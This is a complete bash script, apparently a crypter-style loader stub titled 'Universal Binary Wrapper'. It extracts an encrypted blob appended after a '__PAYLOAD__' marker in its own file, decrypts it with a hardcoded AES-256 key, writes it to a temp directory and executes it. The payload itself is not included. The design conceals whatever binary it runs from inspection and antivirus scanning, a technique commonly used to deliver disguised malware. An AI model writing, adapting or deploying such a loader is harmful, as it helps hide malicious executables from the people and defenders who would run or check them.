#!/bin/bash
# Universal Binary Wrapper - Compatible with OpenSSL 0.9.x to 3.x
# Works on all systems including OpenSSL 1.0.2k-fips

set -e

DECRYPT_KEY="a6678062c521cbb058e35767905a411cb2c3241234982f343cdd6577cf6c8655"

# Find payload marker
PAYLOAD_LINE=$(grep -n "^__PAYLOAD__$" "$0" | head -1 | cut -d: -f1)
if [ -z "$PAYLOAD_LINE" ]; then
    echo "[-] Error: Payload marker not found!" >&2
    exit 1
fi

# Create temp directory
TEMP_DIR=$(mktemp -d)
trap "rm -rf $TEMP_DIR" EXIT

PAYLOAD_FILE="$TEMP_DIR/payload.enc"
BINARY_FILE="$TEMP_DIR/binary"

# Extract payload
tail -n +$((PAYLOAD_LINE + 1)) "$0" > "$PAYLOAD_FILE"

# Decrypt with universal method (no special flags)
# This works on ALL OpenSSL versions (0.9.x to 3.x)
if ! echo "$DECRYPT_KEY" | openssl enc -aes-256-cbc -d -salt \
     -in "$PAYLOAD_FILE" -out "$BINARY_FILE" -base64 -pass stdin 2>/dev/null; then
    echo "[-] Decryption failed!" >&2
    echo "[-] OpenSSL version: $(openssl version 2>&1)" >&2
    exit 1
fi

# Verify decryption succeeded
if [ ! -s "$BINARY_FILE" ]; then
    echo "[-] Decrypted file is empty!" >&2
    exit 1
fi

# Make executable and run
chmod +x "$BINARY_FILE"
exec "$BINARY_FILE" "$@"

